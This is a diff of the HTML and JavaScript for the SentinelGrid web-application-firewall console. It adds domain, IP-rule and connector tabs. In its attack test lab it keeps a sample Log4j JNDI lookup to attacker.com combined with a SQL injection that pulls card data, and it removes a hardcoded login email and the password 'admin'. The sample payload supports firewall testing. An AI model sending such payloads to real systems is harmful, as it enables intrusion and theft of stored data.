@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SentinelGrid // Modular Security Console</title>
+  <title>SentinelGrid // WAAP Operations Console</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -49,8 +49,8 @@
     .app-header {
       background: var(--card-white);
       border-bottom: 1px solid var(--stone-border);
-      padding: 0 32px;
-      height: 72px;
+      padding: 0 28px;
+      height: 70px;
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -66,8 +66,8 @@
     }
 
     .brand-icon {
-      width: 40px;
-      height: 40px;
+      width: 38px;
+      height: 38px;
       border-radius: 10px;
       background: var(--sand-warm);
       color: var(--terracotta);
@@ -79,7 +79,7 @@
     }
 
     .brand-title {
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 800;
       color: var(--text-charcoal);
     }
@@ -87,17 +87,18 @@
     /* Modular Navigation Menu Tabs */
     .nav-menu {
       display: flex;
-      gap: 6px;
+      gap: 4px;
       background: var(--cream-bg);
-      padding: 5px;
+      padding: 4px;
       border-radius: 12px;
       border: 1px solid var(--stone-border);
+      overflow-x: auto;
     }
 
     .nav-item {
-      padding: 8px 16px;
+      padding: 7px 14px;
       border-radius: 8px;
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 600;
       color: var(--text-muted);
       cursor: pointer;
@@ -105,6 +106,7 @@
       display: flex;
       align-items: center;
       gap: 6px;
+      white-space: nowrap;
     }
 
     .nav-item:hover {
@@ -125,13 +127,13 @@
     }
 
     .avatar-circle {
-      width: 36px;
-      height: 36px;
+      width: 34px;
+      height: 34px;
       border-radius: 50%;
       background: var(--sand-warm);
       color: var(--deep-indigo);
       font-weight: 700;
-      font-size: 13px;
+      font-size: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -140,7 +142,7 @@
 
     /* App Container & Views */
     .app-main {
-      padding: 32px;
+      padding: 28px;
       max-width: 1540px;
       margin: 0 auto;
       width: 100%;
@@ -166,7 +168,7 @@
       font-family: var(--font-ui);
       font-size: 13px;
       font-weight: 700;
-      padding: 10px 18px;
+      padding: 9px 16px;
       border-radius: 8px;
       border: 1px solid transparent;
       cursor: pointer;
@@ -179,7 +181,9 @@
     .btn-primary { background: var(--deep-indigo); color: #fff; }
     .btn-primary:hover { background: #1D2B3C; }
     .btn-warm { background: var(--terracotta); color: #fff; }
+    .btn-warm:hover { background: #B9442C; }
     .btn-subtle { background: var(--sand-warm); color: var(--text-charcoal); border-color: var(--stone-border); }
+    .btn-subtle:hover { background: #E6E2D8; }
 
     /* Panels & Cards */
     .panel {
@@ -192,7 +196,7 @@
     }
 
     .panel-header {
-      padding: 18px 24px;
+      padding: 16px 22px;
       border-bottom: 1px solid var(--stone-border);
       background: var(--sand-warm);
       display: flex;
@@ -202,13 +206,13 @@
       font-weight: 700;
     }
 
-    .panel-body { padding: 24px; }
+    .panel-body { padding: 22px; }
 
     /* Clean Tables */
     .table-clean { width: 100%; border-collapse: collapse; font-size: 13px; }
     .table-clean th {
       text-align: left;
-      padding: 12px 20px;
+      padding: 12px 18px;
       background: #F4F2EB;
       color: var(--text-muted);
       font-size: 11px;
@@ -216,21 +220,21 @@
       font-weight: 700;
       border-bottom: 1px solid var(--stone-border);
     }
-    .table-clean td { padding: 14px 20px; border-bottom: 1px solid var(--stone-border); }
+    .table-clean td { padding: 13px 18px; border-bottom: 1px solid var(--stone-border); }
     .table-clean tr:hover { background: #FAF9F6; }
 
     /* Metric Cards */
     .metric-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 20px;
-      margin-bottom: 28px;
+      gap: 18px;
+      margin-bottom: 24px;
     }
     .metric-card {
       background: var(--card-white);
       border: 1px solid var(--stone-border);
       border-radius: var(--radius-md);
-      padding: 24px;
+      padding: 22px;
     }
     .metric-card.terracotta { border-top: 4px solid var(--terracotta); }
     .metric-card.sage { border-top: 4px solid var(--sage-green); }
@@ -238,16 +242,16 @@
     .metric-card.ochre { border-top: 4px solid var(--warm-ochre); }
 
     .metric-val {
-      font-size: 36px;
+      font-size: 32px;
       font-weight: 800;
       font-family: var(--font-mono);
-      margin: 8px 0;
+      margin: 6px 0;
     }
 
     /* Badges */
     .badge {
       display: inline-block;
-      padding: 4px 10px;
+      padding: 4px 9px;
       border-radius: 6px;
       font-size: 11px;
       font-weight: 700;
@@ -257,6 +261,8 @@
     .badge-block { background: var(--terracotta-soft); color: var(--terracotta); }
     .badge-challenge { background: var(--ochre-soft); color: var(--warm-ochre); }
     .badge-shadow { background: #F4E8EE; color: #922B53; }
+    .badge-online { background: #E6F4EA; color: #137333; }
+    .badge-offline { background: #FCE8E6; color: #C5221F; }
 
     /* Auth Forms Modal / Full-Screen view */
     .auth-card {
@@ -265,7 +271,7 @@
       background: var(--card-white);
       border: 1px solid var(--stone-border);
       border-radius: var(--radius-lg);
-      padding: 36px;
+      padding: 34px;
       box-shadow: var(--shadow-md);
     }
 
@@ -274,16 +280,23 @@
       background: var(--cream-bg);
       border: 1px solid var(--stone-border);
       border-radius: 8px;
-      padding: 12px 14px;
+      padding: 11px 13px;
       font-family: var(--font-ui);
-      font-size: 14px;
-      margin: 6px 0 16px;
+      font-size: 13px;
+      margin: 6px 0 14px;
       outline: none;
     }
 
     .form-input:focus {
       border-color: var(--deep-indigo);
       background: var(--card-white);
+    }
+
+    .filter-bar {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 16px;
+      align-items: center;
     }
   </style>
 </head>
@@ -293,16 +306,22 @@
   <header class="app-header">
     <div class="brand-area">
       <div class="brand-icon">🛡️</div>
-      <div class="brand-title">SentinelGrid WAAP</div>
+      <div>
+        <div class="brand-title">SentinelGrid WAAP</div>
+        <div style="font-size: 11px; color: var(--text-muted); font-family: var(--font-mono);">Operations & Control Plane</div>
+      </div>
     </div>
 
     <!-- Modular Menu Tabs -->
     <nav class="nav-menu">
-      <div class="nav-item active" onclick="switchTab('dashboard')">📊 Live Dashboard</div>
+      <div class="nav-item active" onclick="switchTab('dashboard')">📊 Dashboard</div>
+      <div class="nav-item" onclick="switchTab('domains')">🌐 Domains</div>
       <div class="nav-item" onclick="switchTab('inventory')">🔍 Discovered APIs</div>
+      <div class="nav-item" onclick="switchTab('iprules')">🛡️ IP Access Control</div>
+      <div class="nav-item" onclick="switchTab('connectors')">🔌 Connectors</div>
       <div class="nav-item" onclick="switchTab('sandbox')">🧪 In-Line WAF Lab</div>
       <div class="nav-item" onclick="switchTab('simulation')">📈 Policy Simulation</div>
-      <div class="nav-item" onclick="switchTab('onboarding')">🔌 Site Setup Guide</div>
+      <div class="nav-item" onclick="switchTab('onboarding')">📖 Setup Guide</div>
     </nav>
 
     <!-- User / Auth Corner -->
@@ -311,9 +330,9 @@
         <div class="avatar-circle" id="user-avatar">AD</div>
         <div style="font-size: 12px;">
           <div id="user-display-name" style="font-weight: 700;">Anup Dhokiya</div>
-          <div style="color: var(--text-muted);" id="user-display-role">Administrator</div>
+          <div style="color: var(--text-muted);" id="user-display-role">ADMINISTRATOR</div>
         </div>
-        <button class="btn btn-subtle" style="padding: 6px 10px; font-size: 11px;" onclick="switchTab('login')">Sign Out</button>
+        <button class="btn btn-subtle" style="padding: 5px 9px; font-size: 11px;" onclick="switchTab('login')">Sign Out</button>
       </div>
       <button id="auth-login-btn" class="btn btn-primary" style="display: none;" onclick="switchTab('login')">Login / Signup</button>
     </div>
@@ -329,22 +348,22 @@
       <div class="metric-grid">
         <div class="metric-card indigo">
           <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">PROTECTED APIS</div>
-          <div class="metric-val" id="kpi-endpoints">--</div>
-          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-websites">Active Domains</div>
+          <div class="metric-val" id="kpi-endpoints">0</div>
+          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-websites">Across 0 Domains</div>
         </div>
         <div class="metric-card terracotta">
           <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">SHADOW / ZOMBIE APIS</div>
-          <div class="metric-val" id="kpi-shadow" style="color: var(--terracotta);">--</div>
+          <div class="metric-val" id="kpi-shadow" style="color: var(--terracotta);">0</div>
           <div style="font-size: 12px; color: var(--text-muted);">Undocumented Endpoints Flagged</div>
         </div>
         <div class="metric-card sage">
           <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">MITIGATED ATTACKS</div>
-          <div class="metric-val" id="kpi-blocked" style="color: var(--sage-green);">--</div>
-          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-blockrate">--% Block Rate</div>
+          <div class="metric-val" id="kpi-blocked" style="color: var(--sage-green);">0</div>
+          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-blockrate">0.0% Block Rate</div>
         </div>
         <div class="metric-card ochre">
           <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">ED25519 CRYPTO INTEGRITY</div>
-          <div class="metric-val" style="font-size: 24px; padding-top: 10px;">RFC 8032</div>
+          <div class="metric-val" style="font-size: 22px; padding-top: 8px;">RFC 8032</div>
           <div style="font-size: 12px; color: var(--text-muted);">Zero-Trust Asymmetric Seal</div>
         </div>
       </div>
@@ -352,7 +371,22 @@
       <div class="panel">
         <div class="panel-header">
           <span>Real-Time Security Events Stream</span>
-          <button class="btn btn-subtle" onclick="refreshDashboard()">⚡ Refresh Feed</button>
+          <div style="display: flex; gap: 8px;">
+            <button class="btn btn-subtle" onclick="exportEvents()">📥 Export SIEM Logs</button>
+            <button class="btn btn-primary" onclick="refreshDashboard()">⚡ Refresh Feed</button>
+          </div>
+        </div>
+        <div class="panel-body" style="padding-bottom: 0;">
+          <div class="filter-bar">
+            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted);">Filter Verdict:</span>
+            <select id="event-filter-action" class="form-input" style="width: 140px; margin: 0;" onchange="applyEventFilter()">
+              <option value="ALL">All Actions</option>
+              <option value="BLOCK">BLOCK (403)</option>
+              <option value="ALLOW">ALLOW (200)</option>
+              <option value="CHALLENGE">CHALLENGE</option>
+            </select>
+            <input type="text" id="event-search-query" class="form-input" style="max-width: 280px; margin: 0;" placeholder="Search by IP, route path, or rule..." oninput="applyEventFilter()">
+          </div>
         </div>
         <table class="table-clean">
           <thead>
@@ -366,22 +400,86 @@
             </tr>
           </thead>
           <tbody id="telemetry-body">
-            <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">Loading live security events...</td></tr>
+            <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No security events recorded yet. All incoming traffic is clean.</td></tr>
           </tbody>
         </table>
       </div>
     </section>
 
     <!-- ===================================================================== -->
-    <!-- TAB 2: DISCOVERED APIS (SHADOW / ZOMBIE CATALOG) -->
+    <!-- TAB 2: DOMAIN & ASSET MANAGEMENT -->
+    <!-- ===================================================================== -->
+    <section id="view-domains" class="view-section">
+      <div class="panel">
+        <div class="panel-header">
+          <span>Protected Domains & Application Gateways</span>
+          <button class="btn btn-warm" onclick="showAddDomainModal()">+ Add Protected Domain</button>
+        </div>
+        <div class="panel-body">
+          <div id="add-domain-box" style="display: none; background: var(--sand-warm); padding: 20px; border-radius: 10px; margin-bottom: 22px;">
+            <h4 style="font-size: 14px; margin-bottom: 12px;">Register New Domain for Protection</h4>
+            <div style="display: grid; grid-template-columns: 1fr 1fr auto; gap: 12px; align-items: flex-end;">
+              <div>
+                <label style="font-size: 12px; font-weight: 700;">Domain Name</label>
+                <input type="text" id="new-domain-input" class="form-input" placeholder="e.g. api.yourcompany.com" style="margin-bottom: 0;">
+              </div>
+              <div>
+                <label style="font-size: 12px; font-weight: 700;">Application Title</label>
+                <input type="text" id="new-domain-name" class="form-input" placeholder="e.g. Production API Gateway" style="margin-bottom: 0;">
+              </div>
+              <div style="display: flex; gap: 8px;">
+                <button class="btn btn-primary" onclick="submitNewDomain()">Register Domain</button>
+                <button class="btn btn-subtle" onclick="hideAddDomainModal()">Cancel</button>
+              </div>
+            </div>
+          </div>
+
+          <table class="table-clean">
+            <thead>
+              <tr>
+                <th>Status</th>
+                <th>Domain</th>
+                <th>Application Name</th>
+                <th>Endpoints</th>
+                <th>Shadow APIs</th>
+                <th>Total Events</th>
+                <th>Registered</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="domains-table-body">
+              <tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">No domains registered yet. Click '+ Add Protected Domain' above.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 3: DISCOVERED APIS (SHADOW / ZOMBIE CATALOG) -->
     <!-- ===================================================================== -->
     <section id="view-inventory" class="view-section">
       <div class="panel">
         <div class="panel-header">
           <span>Automated API Attack Surface Inventory (Shadow & Zombie Catalog)</span>
-          <button class="btn btn-primary" onclick="loadEndpoints()">Resync Schema</button>
+          <div style="display: flex; gap: 8px;">
+            <button class="btn btn-warm" onclick="toggleSpecImport()">📄 Import OpenAPI Spec</button>
+            <button class="btn btn-primary" onclick="loadEndpoints()">Resync Schema</button>
+          </div>
         </div>
-        <div class="panel-body" style="padding: 0;">
+        <div class="panel-body">
+          <div id="spec-import-box" style="display: none; background: var(--sand-warm); padding: 20px; border-radius: 10px; margin-bottom: 22px;">
+            <h4 style="font-size: 14px; margin-bottom: 8px;">Import OpenAPI 3.0 / Swagger Contract</h4>
+            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
+              Paste your OpenAPI specification (JSON or YAML) below. All defined routes will be cataloged as 'documented', allowing automatic detection of undocumented 'shadow' APIs.
+            </p>
+            <textarea id="spec-content-input" class="form-input" rows="6" placeholder="Paste OpenAPI 3.0 JSON or YAML contract here..."></textarea>
+            <div style="display: flex; gap: 8px;">
+              <button class="btn btn-primary" onclick="submitOpenApiSpec()">Establish Contract</button>
+              <button class="btn btn-subtle" onclick="toggleSpecImport()">Cancel</button>
+            </div>
+          </div>
+
           <table class="table-clean">
             <thead>
               <tr>
@@ -394,7 +492,7 @@
               </tr>
             </thead>
             <tbody id="endpoints-body">
-              <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">Loading API route inventory...</td></tr>
+              <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No endpoints cataloged yet. Paste your OpenAPI specification above or route traffic through SentinelGrid.</td></tr>
             </tbody>
           </table>
         </div>
@@ -402,17 +500,101 @@
     </section>
 
     <!-- ===================================================================== -->
-    <!-- TAB 3: IN-LINE WAF INSPECTION SANDBOX -->
+    <!-- TAB 4: IP ACCESS CONTROL (CIDR ALLOWLIST / BLOCKLIST) -->
+    <!-- ===================================================================== -->
+    <section id="view-iprules" class="view-section">
+      <div class="panel">
+        <div class="panel-header">
+          <span>IP Access Control Lists (Allowlist / Blocklist)</span>
+          <button class="btn btn-warm" onclick="toggleAddIpRule()">+ Add IP Rule</button>
+        </div>
+        <div class="panel-body">
+          <div id="add-iprule-box" style="display: none; background: var(--sand-warm); padding: 20px; border-radius: 10px; margin-bottom: 22px;">
+            <h4 style="font-size: 14px; margin-bottom: 12px;">Add Dynamic IP / CIDR Access Rule</h4>
+            <div style="display: grid; grid-template-columns: 2fr 1fr 2fr auto; gap: 12px; align-items: flex-end;">
+              <div>
+                <label style="font-size: 12px; font-weight: 700;">IP Address or CIDR Block</label>
+                <input type="text" id="ip-rule-addr" class="form-input" placeholder="e.g. 198.51.100.42 or 10.0.0.0/8" style="margin-bottom: 0;">
+              </div>
+              <div>
+                <label style="font-size: 12px; font-weight: 700;">Action</label>
+                <select id="ip-rule-action" class="form-input" style="margin-bottom: 0;">
+                  <option value="BLOCK">BLOCK (Deny)</option>
+                  <option value="ALLOW">ALLOW (Bypass)</option>
+                </select>
+              </div>
+              <div>
+                <label style="font-size: 12px; font-weight: 700;">Description</label>
+                <input type="text" id="ip-rule-desc" class="form-input" placeholder="e.g. Malicious subnet / Partner VPN" style="margin-bottom: 0;">
+              </div>
+              <div style="display: flex; gap: 8px;">
+                <button class="btn btn-primary" onclick="submitIpRule()">Commit Rule</button>
+                <button class="btn btn-subtle" onclick="toggleAddIpRule()">Cancel</button>
+              </div>
+            </div>
+          </div>
+
+          <table class="table-clean">
+            <thead>
+              <tr>
+                <th>Action</th>
+                <th>IP / CIDR Pattern</th>
+                <th>Description</th>
+                <th>Created At</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="iprules-table-body">
+              <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No IP access rules configured. Click '+ Add IP Rule' above.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 5: OBSERVATION CONNECTORS & AGENTS -->
+    <!-- ===================================================================== -->
+    <section id="view-connectors" class="view-section">
+      <div class="panel">
+        <div class="panel-header">
+          <span>Observation Agents & External Site Connectors</span>
+          <button class="btn btn-primary" onclick="loadConnectors()">⚡ Check Status</button>
+        </div>
+        <div class="panel-body">
+          <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">
+            Monitors real-time connectivity and heartbeat status from external reverse proxies (Nginx, Go) and application middleware (Python ASGI, Node.js Express).
+          </p>
+          <table class="table-clean">
+            <thead>
+              <tr>
+                <th>Status</th>
+                <th>Connector Name</th>
+                <th>Integration Type</th>
+                <th>Inspection Latency</th>
+                <th>Last Heartbeat</th>
+              </tr>
+            </thead>
+            <tbody id="connectors-table-body">
+              <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No active connectors registered yet. Follow the 'Setup Guide' to attach your first site.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 6: IN-LINE WAF INSPECTION SANDBOX -->
     <!-- ===================================================================== -->
     <section id="view-sandbox" class="view-section">
-      <div class="panel" style="max-width: 800px; margin: 0 auto;">
+      <div class="panel" style="max-width: 820px; margin: 0 auto;">
         <div class="panel-header">
           <span>In-Line Attack Injection Lab</span>
           <span style="font-size: 12px; font-family: var(--font-mono); color: var(--text-muted);">Sub-1.5ms Inspection Budget</span>
         </div>
         <div class="panel-body">
           <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">
-            Transmit adversarial payloads (SQLi, XSS, Path Traversal, Log4j CVE-2021-44228, Cloud SSRF) to test real-time interception.
+            Transmit adversarial payloads (SQLi, XSS, Path Traversal, Log4j CVE-2021-44228, Cloud SSRF) to test real-time interception and automated shadow API discovery.
           </p>
 
           <label style="font-size: 12px; font-weight: 700;">Target Route & Method</label>
@@ -420,17 +602,19 @@
             <select id="attack-method" class="form-input" style="width: 120px;">
               <option value="POST">POST</option>
               <option value="GET">GET</option>
+              <option value="PUT">PUT</option>
+              <option value="DELETE">DELETE</option>
             </select>
-            <input type="text" id="attack-path" class="form-input" value="/api/v1/checkout/stripe">
+            <input type="text" id="attack-path" class="form-input" placeholder="/api/v1/checkout/stripe">
           </div>
 
           <label style="font-size: 12px; font-weight: 700;">Adversarial Payload (Injection String)</label>
-          <textarea id="attack-body" class="form-input" rows="3">${jndi:ldap://attacker.com/exploit} OR '1'='1' UNION SELECT credit_card FROM vault--</textarea>
+          <textarea id="attack-body" class="form-input" rows="3" placeholder="Enter test payload, e.g. ${jndi:ldap://attacker.com/exploit} OR '1'='1' UNION SELECT credit_card FROM vault--"></textarea>
 
           <label style="font-size: 12px; font-weight: 700;">Client User-Agent / Headers</label>
-          <input type="text" id="attack-ua" class="form-input" value="SqlMap/1.8 (Automated Auditor)">
+          <input type="text" id="attack-ua" class="form-input" placeholder="Mozilla/5.0 ... or attack scanner user-agent (e.g. SqlMap, Nikto)">
 
-          <button class="btn btn-warm" style="width: 100%; justify-content: center; padding: 14px;" onclick="fireLiveAttack()">
+          <button class="btn btn-warm" style="width: 100%; justify-content: center; padding: 13px;" onclick="fireLiveAttack()">
             ⚡ Transmit & Evaluate Through Security Brain
           </button>
 
@@ -440,10 +624,10 @@
     </section>
 
     <!-- ===================================================================== -->
-    <!-- TAB 4: POLICY SIMULATION (DRY-RUN) -->
+    <!-- TAB 7: POLICY SIMULATION (DRY-RUN) -->
     <!-- ===================================================================== -->
     <section id="view-simulation" class="view-section">
-      <div class="panel" style="max-width: 800px; margin: 0 auto;">
+      <div class="panel" style="max-width: 820px; margin: 0 auto;">
         <div class="panel-header">
           <span>Policy Simulation (False-Positive Predictor)</span>
           <button class="btn btn-warm" style="padding: 6px 12px; font-size: 11px;" onclick="triggerRollback()">↺ 1-Click Rollback</button>
@@ -454,12 +638,12 @@
           </p>
 
           <label style="font-size: 12px; font-weight: 700;">Candidate Rule Name</label>
-          <input type="text" id="sim-rule-id" class="form-input" value="block-unverified-bots">
+          <input type="text" id="sim-rule-id" class="form-input" placeholder="e.g. block-unverified-bots">
 
           <label style="font-size: 12px; font-weight: 700;">Match User-Agent Substring</label>
-          <input type="text" id="sim-rule-ua" class="form-input" value="bot">
+          <input type="text" id="sim-rule-ua" class="form-input" placeholder="e.g. scanner-bot, curl, spider">
 
-          <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 14px;" onclick="runSimulation()">
+          <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 13px;" onclick="runSimulation()">
             📈 Replay Historical Traffic Samples
           </button>
 
@@ -469,50 +653,75 @@
     </section>
 
     <!-- ===================================================================== -->
-    <!-- TAB 5: ONBOARDING / SETUP ON OTHER SITES -->
+    <!-- TAB 8: ONBOARDING / SETUP ON OTHER SITES -->
     <!-- ===================================================================== -->
     <section id="view-onboarding" class="view-section">
       <div class="panel">
         <div class="panel-header">
-          <span>How to Integrate SentinelGrid on External Sites & Applications</span>
-          <a href="/docs/HOW_TO_SETUP_ON_OTHER_SITES.txt" target="_blank" class="btn btn-primary" style="font-size: 11px; padding: 6px 12px; text-decoration: none;">Download TXT Guide</a>
+          <span>How to Connect Any External Site for Live Observation</span>
+          <a href="/docs/CONNECT_ANY_SITE_FOR_OBSERVATION.txt" target="_blank" class="btn btn-primary" style="font-size: 11px; padding: 6px 12px; text-decoration: none;">Download Plain Text Guide</a>
         </div>
         <div class="panel-body">
-          <h3 style="font-size: 16px; margin-bottom: 12px;">3-Step Integration Workflow</h3>
+          <h3 style="font-size: 16px; margin-bottom: 12px;">Zero-Downtime Integration Architecture</h3>
           <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
-            SentinelGrid operates seamlessly via <strong>Nginx Reverse Proxy</strong>, <strong>Python ASGI Middleware</strong>, or <strong>Node.js Express Middleware</strong> without changing your database or application architecture.
+            SentinelGrid inspects requests in-line with a <strong>&lt; 1.5ms latency budget</strong>. Connect any site via Nginx Reverse Proxy, Python ASGI Middleware, Node.js Express, or Go reverse proxy.
           </p>
 
-          <div style="background: var(--sand-warm); padding: 18px; border-radius: 10px; font-family: var(--font-mono); font-size: 13px; line-height: 1.6;">
-            <strong>Step 1: Point your site's proxy/middleware to SentinelGrid:</strong><br>
-            <code>Endpoint: http://localhost:8000/v1/inspect</code><br><br>
-            <strong>Step 2: Inspect requests in-line (< 1.5ms budget):</strong><br>
-            If SentinelGrid returns <code>action: "BLOCK"</code>, return <code>HTTP 403 Forbidden</code>.<br>
-            If SentinelGrid returns <code>action: "ALLOW"</code>, pass the request to your backend.<br><br>
-            <strong>Step 3: Access Full Detailed Instructions:</strong><br>
-            Read the dedicated documentation file located at: <code>/run/media/anup/D/sentinelgrid/docs/HOW_TO_SETUP_ON_OTHER_SITES.txt</code>
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px;">
+            <div style="background: var(--sand-warm); padding: 18px; border-radius: 10px;">
+              <h4 style="font-size: 13px; font-weight: 700; margin-bottom: 8px;">Option A: Nginx Reverse Proxy</h4>
+              <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">Use <code>auth_request</code> or <code>mirror</code> to validate requests before passing to upstream.</p>
+              <pre style="background: var(--card-white); padding: 12px; border-radius: 6px; font-family: var(--font-mono); font-size: 11px; overflow-x: auto;">location /api/ {
+    auth_request /_sentinel_check;
+    proxy_pass http://upstream_app;
+}
+location = /_sentinel_check {
+    internal;
+    proxy_pass http://127.0.0.1:8000/v1/inspect;
+    proxy_pass_request_body on;
+}</pre>
+            </div>
+
+            <div style="background: var(--sand-warm); padding: 18px; border-radius: 10px;">
+              <h4 style="font-size: 13px; font-weight: 700; margin-bottom: 8px;">Option B: Python ASGI Middleware</h4>
+              <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">Drop-in middleware for FastAPI, Starlette, or Django ASGI applications.</p>
+              <pre style="background: var(--card-white); padding: 12px; border-radius: 6px; font-family: var(--font-mono); font-size: 11px; overflow-x: auto;">from sentinelgrid.middleware import SentinelGridMiddleware
+
+app = FastAPI()
+app.add_middleware(
+    SentinelGridMiddleware,
+    control_plane_url="http://127.0.0.1:8000",
+    fail_open=True
+)</pre>
+            </div>
+          </div>
+
+          <div style="background: var(--cream-bg); border: 1px solid var(--stone-border); padding: 16px; border-radius: 8px; font-size: 13px;">
+            <strong>Full Observation Guide Documentation:</strong><br>
+            A dedicated, production-grade integration guide has been authored on your D drive at:<br>
+            <code>/run/media/anup/D/sentinelgrid/docs/CONNECT_ANY_SITE_FOR_OBSERVATION.md</code>
           </div>
         </div>
       </div>
     </section>
 
     <!-- ===================================================================== -->
-    <!-- TAB 6: LOGIN & SIGNUP PORTAL -->
+    <!-- TAB 9: LOGIN & SIGNUP PORTAL -->
     <!-- ===================================================================== -->
     <section id="view-login" class="view-section">
       <div class="auth-card">
         <div style="text-align: center; margin-bottom: 24px;">
           <div class="brand-icon" style="margin: 0 auto 12px;">🛡️</div>
-          <h2 style="font-size: 22px; font-weight: 800;">SentinelGrid Authentication</h2>
+          <h2 style="font-size: 20px; font-weight: 800;">SentinelGrid Authentication</h2>
           <p style="color: var(--text-muted); font-size: 13px;">Sign in to access your tenant WAAP console</p>
         </div>
 
         <div id="login-form-box">
           <label style="font-size: 12px; font-weight: 700;">Email Address</label>
-          <input type="email" id="auth-email" class="form-input" value="anupdhokiya0@gmail.com">
+          <input type="email" id="auth-email" class="form-input" placeholder="analyst@domain.com">
 
           <label style="font-size: 12px; font-weight: 700;">Password</label>
-          <input type="password" id="auth-password" class="form-input" value="admin">
+          <input type="password" id="auth-password" class="form-input" placeholder="••••••••">
 
           <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 12px;" onclick="handleLogin()">
             Sign In to Console
@@ -549,6 +758,7 @@
   <!-- Interactive Modular JavaScript Controller -->
   <script>
     const API = "/v1";
+    let allRecentEvents = [];
 
     function switchTab(tabId) {
       document.querySelectorAll(".view-section").forEach(el => el.classList.remove("active"));
@@ -557,13 +767,15 @@
       const target = document.getElementById("view-" + tabId);
       if (target) target.classList.add("active");
 
-      // Set active nav tab
       const navItems = Array.from(document.querySelectorAll(".nav-item"));
       const match = navItems.find(el => el.getAttribute("onclick")?.includes(tabId));
       if (match) match.classList.add("active");
 
       if (tabId === "dashboard") refreshDashboard();
+      if (tabId === "domains") loadDomains();
       if (tabId === "inventory") loadEndpoints();
+      if (tabId === "iprules") loadIpRules();
+      if (tabId === "connectors") loadConnectors();
     }
 
     function toggleAuthMode(mode) {
@@ -577,8 +789,12 @@
     }
 
     async function handleLogin() {
-      const email = document.getElementById("auth-email").value;
-      const pwd = document.getElementById("auth-password").value;
+      const email = document.getElementById("auth-email").value.trim();
+      const pwd = document.getElementById("auth-password").value.trim();
+      if (!email || !pwd) {
+        alert("Please enter both email and password.");
+        return;
+      }
 
       try {
         const res = await fetch(`${API}/auth/login`, {
@@ -593,7 +809,7 @@
           document.getElementById("user-display-role").innerText = data.user.role.toUpperCase();
           switchTab("dashboard");
         } else {
-          alert("Login error: " + data.detail);
+          alert("Login error: " + (data.detail || "Authentication failed"));
         }
       } catch (e) {
         alert("Authentication failed: " + e);
@@ -601,9 +817,13 @@
     }
 
     async function handleSignup() {
-      const name = document.getElementById("signup-name").value;
-      const email = document.getElementById("signup-email").value;
-      const pwd = document.getElementById("signup-password").value;
+      const name = document.getElementById("signup-name").value.trim();
+      const email = document.getElementById("signup-email").value.trim();
+      const pwd = document.getElementById("signup-password").value.trim();
+      if (!name || !email || !pwd) {
+        alert("Please fill out all registration fields.");
+        return;
+      }
 
       try {
         const res = await fetch(`${API}/auth/signup`, {
@@ -618,7 +838,7 @@
           document.getElementById("user-display-role").innerText = "ANALYST";
           switchTab("dashboard");
         } else {
-          alert("Registration error: " + data.detail);
+          alert("Registration error: " + (data.detail || "Signup failed"));
         }
       } catch (e) {
         alert("Registration failed: " + e);
@@ -629,32 +849,186 @@
       try {
         const res = await fetch(`${API}/overview`);
         const data = await res.json();
-        document.getElementById("kpi-endpoints").innerText = data.endpoints_count;
-        document.getElementById("kpi-websites").innerText = `Across ${data.websites_count} Domains`;
-        document.getElementById("kpi-shadow").innerText = data.shadow_endpoints_count;
-        document.getElementById("kpi-blocked").innerText = data.blocked_events;
-        document.getElementById("kpi-blockrate").innerText = `${data.block_rate_percent}%`;
+        document.getElementById("kpi-endpoints").innerText = data.endpoints_count || 0;
+        document.getElementById("kpi-websites").innerText = `Across ${data.websites_count || 0} Domains`;
+        document.getElementById("kpi-shadow").innerText = data.shadow_endpoints_count || 0;
+        document.getElementById("kpi-blocked").innerText = data.blocked_events || 0;
+        document.getElementById("kpi-blockrate").innerText = `${data.block_rate_percent || 0.0}% Block Rate`;
 
